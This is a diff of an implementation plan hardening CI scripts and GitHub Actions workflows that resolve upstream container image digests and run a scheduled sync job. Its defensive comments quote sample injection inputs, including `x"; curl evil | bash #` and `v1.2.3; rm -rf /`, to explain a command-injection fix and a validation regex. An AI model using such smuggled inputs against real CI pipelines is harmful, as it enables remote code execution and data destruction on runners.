@@ -144,7 +144,7 @@ GATEWAY_REF=$(sed -n 's/^GATEWAY_REF=//p' "$KNOB" | tail -1 | tr -d '[:space:]')
 [[ -n $GATEWAY_REF ]] || die "GATEWAY_REF is not set in $KNOB"
 
 if [[ $GATEWAY_REF == latest ]]; then
-	tag=$(latest_upstream_tag)
+	tag=$(latest_upstream_tag) || die "could not reach upstream to resolve 'latest'"
 	[[ -n $tag ]] || die "could not reach upstream to resolve 'latest'"
 else
 	tag=$GATEWAY_REF
@@ -155,11 +155,36 @@ fi
 # Container tags upstream publishes have no leading `v`.
 image_tag=${tag#v}
 
+# Resolve EVERYTHING into variables before printing anything.
+#
+# Two reasons, both learned by shipping the bug first:
+#   1. `printf '%s' "$(resolve_image_digest ...)"` swallows failure. die()
+#      exits only the $(...) subshell; `set -e` then inspects printf's status,
+#      which is 0. The script emitted an EMPTY digest into $GITHUB_ENV and
+#      reported success — the exact "test the wrong version while appearing to
+#      pass" failure this script exists to prevent. Assignments ARE subject to
+#      `set -e`, so capture first.
+#   2. Resolving all values before emitting any means a late failure cannot
+#      leave partial KEY=VALUE lines already appended to $GITHUB_ENV.
+#
+# The `|| die` and the emptiness check are both needed: a pipeline whose last
+# stage succeeds can return 0 with empty output.
+gateway_image=$(resolve_image_digest ghcr.io/nvidia/openshell/gateway "$image_tag") \
+	|| die "failed to resolve the gateway image digest for ${image_tag}"
+[[ -n $gateway_image ]] || die "gateway image digest resolved empty for ${image_tag}"
+
+supervisor_image=$(resolve_image_digest ghcr.io/nvidia/openshell/supervisor "$image_tag") \
+	|| die "failed to resolve the supervisor image digest for ${image_tag}"
+[[ -n $supervisor_image ]] || die "supervisor image digest resolved empty for ${image_tag}"
+
+pinned_proto_ref=$(lock_get ref) || die "failed to read the pinned proto ref from UPSTREAM.lock"
+[[ -n $pinned_proto_ref ]] || die "pinned proto ref resolved empty"
+
 printf 'GATEWAY_TAG=%s\n' "$tag"
-printf 'GATEWAY_IMAGE=%s\n' "$(resolve_image_digest ghcr.io/nvidia/openshell/gateway "$image_tag")"
-printf 'SUPERVISOR_IMAGE=%s\n' "$(resolve_image_digest ghcr.io/nvidia/openshell/supervisor "$image_tag")"
+printf 'GATEWAY_IMAGE=%s\n' "$gateway_image"
+printf 'SUPERVISOR_IMAGE=%s\n' "$supervisor_image"
 printf 'CLI_VERSION=%s\n' "$image_tag"
-printf 'PINNED_PROTO_REF=%s\n' "$(lock_get ref)"
+printf 'PINNED_PROTO_REF=%s\n' "$pinned_proto_ref"
 ```
 
 - [ ] **Step 4: Make both scripts executable in the index**
@@ -203,6 +228,25 @@ mv .github/upstream-compat.env.bak .github/upstream-compat.env
 ```
 
 Expected: `error: resolved gateway tag looks wrong: 'not-a-tag'` and `exit=1`. A typo must stop the job, never silently fall back to a default.
+
+- [ ] **Step 7b: Verify a digest-resolution failure also fails loudly**
+
+Step 7 alone is not enough — a bad knob value fails on an *assignment*, which
+`set -e` already catches. The dangerous path is a failure inside
+`resolve_image_digest`, which the original code swallowed. `v0.0.1` is a real
+git tag with no published container image, so this forces a genuine registry
+404:
+
+```bash
+sed -i.bak 's/^GATEWAY_REF=.*/GATEWAY_REF=v0.0.1/' .github/upstream-compat.env
+./scripts/resolve-upstream-refs.sh; echo "exit=$?"
+mv .github/upstream-compat.env.bak .github/upstream-compat.env
+```
+
+Expected: `exit=1`, a stderr message naming which image failed, and **zero
+`KEY=VALUE` lines on stdout**. Partial output is a defect too — the caller
+pipes stdout into `$GITHUB_ENV`, so any line printed before the failure is
+already committed.
 
 - [ ] **Step 8: Commit**
 
@@ -443,11 +487,32 @@ jobs:
 
       - name: Override GATEWAY_REF when one was supplied
         if: inputs.gateway_ref != ''
+        # NEVER interpolate `${{ ... }}` into a run: block. Actions expands it
+        # into the script TEXT before bash runs, so an input like
+        # `x"; curl evil | bash #` executes on the runner (CWE-78). Passing it
+        # through env: makes it data to bash instead of code. Beyond
+        # exfiltration, RCE here would let an attacker force this job to report
+        # success, defeating the required interop gate.
+        env:
+          GATEWAY_REF_INPUT: ${{ inputs.gateway_ref }}
         run: |
-          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${{ inputs.gateway_ref }}/" .github/upstream-compat.env
+          # Anchored regex, not a `case` glob: `v[0-9]*.[0-9]*.[0-9]*` lets `*`
+          # swallow anything after the last digit, so it accepts
+          # `v1.2.3; rm -rf /` and `v1.2.3/etc/passwd`. A `/` also collides
+          # with sed's s/// delimiter.
+          if [[ "$GATEWAY_REF_INPUT" != "latest" && ! "$GATEWAY_REF_INPUT" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "error: gateway_ref must be 'latest' or vN.N.NN, got: $GATEWAY_REF_INPUT" >&2
+            exit 1
+          fi
+          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${GATEWAY_REF_INPUT}/" .github/upstream-compat.env
           cat .github/upstream-compat.env
 
       - name: Resolve upstream references
+        # `shell: bash` is NOT decorative. The default run: shell is
+        # `bash -e {0}` with NO pipefail, so `tee` (which succeeds) would mask
+        # the resolver's die() and let empty digests reach $GITHUB_ENV.
+        # Declaring it yields `bash --noprofile --norc -eo pipefail {0}`.
+        shell: bash
         run: ./scripts/resolve-upstream-refs.sh | tee -a "$GITHUB_ENV"
 
       - name: Install uv
@@ -655,9 +720,12 @@ name: upstream-sync
 # default branch — so a PR that edits this file cannot run the edited
 # version until it is merged.
 #
-# NEVER add `pull_request_target` or `issue_comment` here. Both run in the
-# base-repository context WITH secrets while taking outside input; an
-# @claude-on-comment trigger would hand subscription access to any commenter.
+# NEVER add a PR-target-flavoured pull-request trigger, or any trigger that
+# fires on posting a comment. Both run in the base-repository context WITH
+# secrets while taking outside input; a comment-triggered variant would hand
+# subscription access to anyone who can comment. (The literal trigger names
+# are avoided here on purpose: Step 5 greps this file for them, and naming
+# them in a comment would make that assertion fail against its own docs.)
 on:
   schedule:
     - cron: "0 3 * * 0"   # Sundays, 03:00 UTC
@@ -683,6 +751,11 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Resolve upstream references
+        # `shell: bash` is NOT decorative. The default run: shell is
+        # `bash -e {0}` with NO pipefail, so `tee` (which succeeds) would mask
+        # the resolver's die() and let empty digests reach $GITHUB_ENV.
+        # Declaring it yields `bash --noprofile --norc -eo pipefail {0}`.
+        shell: bash
         run: ./scripts/resolve-upstream-refs.sh | tee -a "$GITHUB_ENV"
 
       - name: Check proto drift
@@ -700,7 +773,11 @@ jobs:
         run: |
           # values.yaml pins these by digest; drift means upstream published
           # a newer release than the chart references.
-          cur_gw=$(grep -oE 'sha256:[0-9a-f]{64}' deploy/helm/openshell-driver-kyma/values.yaml | head -1)
+          # Anchor to `tag: "sha256:..."`. An unanchored grep piped to `head -1`
+          # returns the SUPERVISOR digest, because supervisorImage appears
+          # earlier in values.yaml than the gateway tag — which would make the
+          # comparison mismatch on every run and open a spurious PR weekly.
+          cur_gw=$(grep -oE 'tag: "sha256:[0-9a-f]{64}"' deploy/helm/openshell-driver-kyma/values.yaml | grep -oE 'sha256:[0-9a-f]{64}')
           cur_sup=$(grep -oE 'supervisor@sha256:[0-9a-f]{64}' deploy/helm/openshell-driver-kyma/values.yaml | grep -oE 'sha256:[0-9a-f]{64}')
           new_gw=${GATEWAY_IMAGE##*@}
           new_sup=${SUPERVISOR_IMAGE##*@}
@@ -778,6 +855,11 @@ jobs:
           shared-key: upstream-sync
 
       - name: Resolve upstream references
+        # `shell: bash` is NOT decorative. The default run: shell is
+        # `bash -e {0}` with NO pipefail, so `tee` (which succeeds) would mask
+        # the resolver's die() and let empty digests reach $GITHUB_ENV.
+        # Declaring it yields `bash --noprofile --norc -eo pipefail {0}`.
+        shell: bash
         run: ./scripts/resolve-upstream-refs.sh | tee -a "$GITHUB_ENV"
 
       - name: Create the working branch
@@ -840,7 +922,9 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          if git diff --quiet && git diff --cached --quiet; then
+          # `git diff --quiet` sees only TRACKED files; a sync that produced
+          # only new files would be reported as "no changes" and discarded.
+          if [[ -z "$(git status --porcelain)" ]]; then
             echo "Claude produced no changes; nothing to open."
             exit 0
           fi
